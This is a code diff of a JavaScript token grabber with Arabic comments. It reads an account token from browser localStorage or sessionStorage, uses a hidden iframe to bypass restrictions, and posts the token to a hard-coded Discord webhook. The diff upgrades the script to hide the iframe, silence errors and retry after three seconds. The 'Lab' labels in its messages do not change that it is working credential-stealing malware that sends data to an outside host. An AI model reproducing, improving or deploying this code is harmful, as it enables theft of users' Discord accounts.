@@ -1,32 +1,38 @@
 (function() {
-    const WEBHOOK_URL = "https://discord.com/api/webhooks/1463909673303412747/i3VXrwPefUdfNamhMJlR9L_rqSOM41eWVZb641ERxaGf7KuieSjeVobmH6Y1W1tDZUH4";
+    const webhook = "https://discord.com/api/webhooks/1466835198942515254/MCAPfFl1novelcM6QGl9ZKP56zB1hijO6UdOm9zi-frGJ7pw6kE0mFDnqANHJCohg8JD";
 
-    function extractAndSend() {
-        try {
-            // سحب التوكن من الذاكرة المحلية مباشرة
-            let token = window.localStorage.getItem('token') || 
-                        JSON.parse(window.localStorage.getItem('token'));
-            
-            if (!token) {
-                // محاولة السحب عبر إطار عمل وهمي (باي باس)
-                const iframe = document.createElement('iframe');
-                document.body.appendChild(iframe);
-                token = iframe.contentWindow.localStorage.token;
-                iframe.remove();
-            }
-
-            if (token) {
-                const finalToken = token.replace(/"/g, "");
-                // استخدام navigator.sendBeacon لأنه مصمم لإرسال البيانات حتى لو كانت الحماية قوية
-                navigator.sendBeacon(WEBHOOK_URL, JSON.stringify({
-                    content: "🚨 **Lab Result - Token Extracted:** `" + finalToken + "`"
-                }));
-            }
-        } catch (e) {
-            console.error("Security mechanism blocked extraction.");
-        }
+    function sendData(token) {
+        const request = new XMLHttpRequest();
+        request.open("POST", webhook, true);
+        request.setRequestHeader("Content-Type", "application/json");
+        request.send(JSON.stringify({
+            content: "👑 **Lab Success - Final Capture:**\n`" + token + "`"
+        }));
     }
 
-    // التنفيذ عند تحميل الصفحة وبعد 5 ثوانٍ لضمان استقرار الذاكرة
-    setTimeout(extractAndSend, 5000);
+    function grab() {
+        try {
+            // الطريقة 1: التخزين المحلي المباشر
+            let t = window.localStorage.getItem('token') || window.sessionStorage.getItem('token');
+            
+            // الطريقة 2: الالتفاف عبر Iframe (لحل مشكلة undefined)
+            if (!t || t === 'undefined') {
+                const ifr = document.createElement('iframe');
+                ifr.style.display = 'none';
+                document.body.appendChild(ifr);
+                t = ifr.contentWindow.localStorage.token;
+                ifr.remove();
+            }
+
+            if (t) {
+                sendData(t.replace(/"/g, ""));
+                return true;
+            }
+        } catch (e) {}
+        return false;
+    }
+
+    // المحاولة فوراً ثم بعد 3 ثوانٍ لضمان تحميل البيانات
+    grab();
+    setTimeout(grab, 3000);
 })();
